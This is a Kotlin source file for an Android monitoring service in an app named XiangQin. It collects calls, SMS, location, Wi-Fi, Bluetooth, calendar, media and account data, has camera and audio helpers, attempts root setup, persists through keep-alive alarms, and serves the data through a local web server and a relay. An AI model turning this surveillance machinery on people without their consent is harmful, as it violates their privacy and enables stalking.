package com.xiangqin.app.service

import android.app.Notification
import android.app.PendingIntent
import android.app.Service
import android.content.Intent
import android.os.Build
import android.os.IBinder
import android.os.PowerManager
import androidx.core.app.NotificationCompat
import com.xiangqin.app.MainActivity
import com.xiangqin.app.XiangQinApp
import com.xiangqin.app.monitor.*
import com.xiangqin.app.receiver.KeepAliveReceiver
import com.xiangqin.app.server.WebServer
import android.provider.Telephony
import android.content.Context
import android.content.IntentFilter
import kotlinx.coroutines.*
import com.xiangqin.app.data.db.AlertEntity

class MonitoringService : Service() {

    val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var webServer: WebServer? = null
    private var contentObserver: CallSmsContentObserver? = null
    private var sentSmsObserver: SentSmsObserver? = null
    private var smsReceiverRegistered = false
    private var callStateMonitor: CallStateMonitor? = null
    private var outgoingCallReceiverRegistered = false
    private var settingsReceiverRegistered = false
    private lateinit var scheduler: MonitorScheduler

    private fun logE(tag: String, msg: String, e: Exception? = null) {
        val errMsg = e?.message ?: "unknown"
        android.util.Log.e("XiangQin/$tag", "$msg ($errMsg)", e)
        log("ERROR [$tag] $msg ($errMsg)")
    }

    private fun log(msg: String) {
        serviceScope.launch {
            try {
                XiangQinApp.instance.database.systemLogDao().insert(
                    com.xiangqin.app.data.db.SystemLogEntity(
                        logType = "event", message = msg, createdTime = System.currentTimeMillis()
                    )
                )
            } catch (e: Exception) { android.util.Log.e("XiangQin", "Error", e) }
        }
    }

    private lateinit var callMonitor: CallMonitor
    private lateinit var smsMonitor: SmsMonitor
    private lateinit var usageMonitor: UsageMonitor
    private lateinit var networkMonitor: NetworkMonitor
    private lateinit var locationMonitor: LocationMonitor
    private lateinit var bluetoothMonitor: BluetoothMonitor
    private lateinit var wifiMonitor: WifiMonitor
    private lateinit var activityMonitor: ActivityMonitor
    private lateinit var sensorMonitor: SensorMonitor
    private lateinit var calendarMonitor: CalendarMonitor
    private lateinit var mediaIndexer: MediaIndexer
    private lateinit var accountMonitor: AccountMonitor
    private lateinit var simMonitor: SimMonitor
    private lateinit var cellMonitor: CellMonitor
    lateinit var cameraCapture: CameraCaptureHelper
        private set
    lateinit var audioRecorder: AudioRecorderHelper
        private set
    private lateinit var alertEngine: AlertEngine

    override fun onCreate() {
        super.onCreate()
        callMonitor = CallMonitor(this)
        smsMonitor = SmsMonitor(this)
        usageMonitor = UsageMonitor(this)
        networkMonitor = NetworkMonitor(this)
        locationMonitor = LocationMonitor(this)
        bluetoothMonitor = BluetoothMonitor(this)
        wifiMonitor = WifiMonitor(this)
        activityMonitor = ActivityMonitor(this)
        sensorMonitor = SensorMonitor(this)
        calendarMonitor = CalendarMonitor(this)
        mediaIndexer = MediaIndexer(this)
        accountMonitor = AccountMonitor(this)
        cameraCapture = CameraCaptureHelper(this)
        audioRecorder = AudioRecorderHelper()
        alertEngine = AlertEngine(this)
        simMonitor = SimMonitor(this)
        cellMonitor = CellMonitor(this)
        scheduler = MonitorScheduler(this, serviceScope)
        log("MonitoringService created")
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val restartReason = intent?.getStringExtra("RESTART_REASON") ?: "manual"
        if (intent?.getBooleanExtra("STOP_SERVICE", false) == true) { stopSelf(); return START_NOT_STICKY }

        startForeground(NOTIFICATION_ID, createNotification())

        val wakeLock = (getSystemService(POWER_SERVICE) as PowerManager).run {
            newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "XiangQin:StartupLock")
        }
        wakeLock?.acquire(10_000L)
        log("MonitoringService started (reason=$restartReason)")

        serviceScope.launch {
            try {
                if (com.xiangqin.app.util.RootPermissionHelper.isRootAvailable()) {
                    com.xiangqin.app.util.RootPermissionHelper.fullSetup(this@MonitoringService)
                }
            } catch (e: Exception) { logE("Root", "Root 配置失败", e) }
        }

        KeepAliveReceiver.scheduleNextAlarm(this)

        serviceScope.launch {
            try { XiangQinApp.instance.dataStore.setLastBootTime(System.currentTimeMillis()) }
            catch (e: Exception) { logE("Boot", "记录开机时间失败", e) }
        }

        serviceScope.launch {
            try { simMonitor.initSimInfo() }
            catch (e: Exception) { logE("SIM", "初始化SIM信息失败", e) }
        }

        if (webServer == null) {
            webServer = WebServer(applicationContext, this)
            serviceScope.launch {
                try { webServer?.start(); log("WebServer started on port 8080") }
                catch (e: Exception) { log("WebServer failed: ${e.message}") }
            }
        }

        try { com.xiangqin.app.relay.RelayClient.start(); log("RelayClient started") }
        catch (e: Exception) { logE("Relay", "中继连接失败", e) }

        registerReceivers()
        scheduler.startAll(
            callMonitor, smsMonitor, usageMonitor, networkMonitor,
            locationMonitor, bluetoothMonitor, wifiMonitor, activityMonitor,
            sensorMonitor, calendarMonitor, mediaIndexer, accountMonitor,
            cellMonitor, alertEngine
        )

        isRunning = true
        serviceStartTime = System.currentTimeMillis()
        return START_STICKY
    }

    private fun registerReceivers() {
        contentObserver = CallSmsContentObserver(
            context = this,
            onCallChanged = {
                try { callMonitor.sync(); broadcastEvent("call_updated", """{"time":${System.currentTimeMillis()}}""") }
                catch (e: Exception) { logE("ContentObs", "通话变化同步失败", e) }
            },
            onSmsChanged = {
                try { smsMonitor.sync(); broadcastEvent("sms_updated", """{"time":${System.currentTimeMillis()}}""") }
                catch (e: Exception) { logE("ContentObs", "短信变化同步失败", e) }
            }
        ).apply { register() }

        if (!smsReceiverRegistered) {
            try {
                val filter = android.content.IntentFilter(Telephony.Sms.Intents.SMS_RECEIVED_ACTION)
                filter.priority = IntentFilter.SYSTEM_HIGH_PRIORITY
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) registerReceiver(SmsReceiver(), filter, Context.RECEIVER_EXPORTED)
                else registerReceiver(SmsReceiver(), filter)
                smsReceiverRegistered = true
            } catch (e: Exception) { logE("SMS", "注册实时短信接收器失败", e) }
        }

        if (sentSmsObserver == null) {
            try {
                val observer = SentSmsObserver(contentResolver = contentResolver, smsDao = XiangQinApp.instance.database.smsDao())
                contentResolver.registerContentObserver(Telephony.Sms.Sent.CONTENT_URI, true, observer)
                sentSmsObserver = observer
            } catch (e: Exception) { logE("SMS", "注册发件箱观察者失败", e) }
        }

        if (callStateMonitor == null) { val cm = CallStateMonitor(this); cm.register(); callStateMonitor = cm }

        if (!outgoingCallReceiverRegistered) {
            try {
                val filter = @Suppress("DEPRECATION") IntentFilter(Intent.ACTION_NEW_OUTGOING_CALL)
                filter.priority = IntentFilter.SYSTEM_HIGH_PRIORITY
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) registerReceiver(OutgoingCallReceiver(), filter, Context.RECEIVER_EXPORTED)
                else registerReceiver(OutgoingCallReceiver(), filter)
                outgoingCallReceiverRegistered = true
            } catch (e: Exception) { logE("Call", "注册去电接收器失败", e) }
        }

        if (!settingsReceiverRegistered) {
            try {
                registerReceiver(SystemSettingsChangeReceiver(), SystemSettingsChangeReceiver.getIntentFilter())
                settingsReceiverRegistered = true
            } catch (e: Exception) { logE("Settings", "注册系统设置监听器失败", e) }
        }
    }

    override fun onDestroy() {
        isRunning = false
        contentObserver?.unregister(); contentObserver = null
        serviceScope.cancel()
        webServer?.stop(); webServer = null
        KeepAliveReceiver.cancelAlarm(this)
        log("MonitoringService destroyed")
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = null

    private fun createNotification(): Notification {
        val pendingIntent = PendingIntent.getActivity(this, 0, Intent(this, MainActivity::class.java), PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT)
        val stopIntent = PendingIntent.getService(this, 1, Intent(this, MonitoringService::class.java).apply { putExtra("STOP_SERVICE", true) }, PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT)
        return NotificationCompat.Builder(this, XiangQinApp.CHANNEL_MONITORING)
            .setContentTitle("乡亲监控运行中").setContentText("点击查看详情 · 下拉锁定可防止被清理")
            .setSmallIcon(android.R.drawable.ic_menu_info_details).setContentIntent(pendingIntent)
            .setOngoing(true).setSilent(false).setPriority(NotificationCompat.PRIORITY_MIN)
            .addAction(android.R.drawable.ic_menu_close_clear_cancel, "停止", stopIntent)
            .setCategory(NotificationCompat.CATEGORY_SERVICE).build()
    }

    fun showAlertNotifications(alerts: List<AlertEntity>) {
        try {
            val manager = getSystemService(android.app.NotificationManager::class.java)
            for (alert in alerts) {
                val notification = NotificationCompat.Builder(this, XiangQinApp.CHANNEL_ALERT)
                    .setContentTitle(alert.title).setContentText(alert.message.take(200))
                    .setSmallIcon(android.R.drawable.ic_dialog_alert).setAutoCancel(true)
                    .setPriority(when (alert.severity) { "critical" -> NotificationCompat.PRIORITY_MAX; "warning" -> NotificationCompat.PRIORITY_HIGH; else -> NotificationCompat.PRIORITY_DEFAULT })
                    .setCategory(NotificationCompat.CATEGORY_ALARM).build()
                manager.notify(ALERT_NOTIFICATION_BASE_ID + alert.id.toInt(), notification)
            }
        } catch (e: Exception) { logE("Notif", "告警本地通知失败", e) }
    }

    fun broadcastEvent(type: String, data: String) {
        serviceScope.launch {
            try { com.xiangqin.app.server.EventBroadcaster.broadcast(type, data) }
            catch (e: Exception) { android.util.Log.w("XiangQin", "广播事件失败: ${e.message}") }
        }
    }

    companion object {
        const val NOTIFICATION_ID = 1001
        const val ALERT_NOTIFICATION_BASE_ID = 2000
        const val FALLBACK_SYNC_INTERVAL_MS = 15 * 60_000L
        const val USAGE_SYNC_INTERVAL_MS = 15 * 60_000L
        const val TRAFFIC_SYNC_INTERVAL_MS = 15 * 60_000L
        const val HEARTBEAT_INTERVAL_MS = 15 * 60_000L
        const val LOCATION_INTERVAL_MS = 30 * 60_000L
        const val BLUETOOTH_INTERVAL_MS = 30 * 60_000L
        const val WIFI_INTERVAL_MS = 30 * 60_000L
        const val ACTIVITY_INTERVAL_MS = 15 * 60_000L
        const val SENSOR_INTERVAL_MS = 15 * 60_000L
        const val CALENDAR_INTERVAL_MS = 30 * 60_000L
        const val MEDIA_INTERVAL_MS = 120 * 60_000L
        const val ACCOUNT_INTERVAL_MS = 6 * 60 * 60_000L
        const val ALERT_CHECK_INTERVAL_MS = 10 * 60_000L
        const val CELL_INTERVAL_MS = 60 * 60_000L

        @Volatile var isRunning = false; private set
        var serviceStartTime = 0L; private set
        val serviceUptime: Long get() = if (serviceStartTime > 0) System.currentTimeMillis() - serviceStartTime else 0L
    }
}
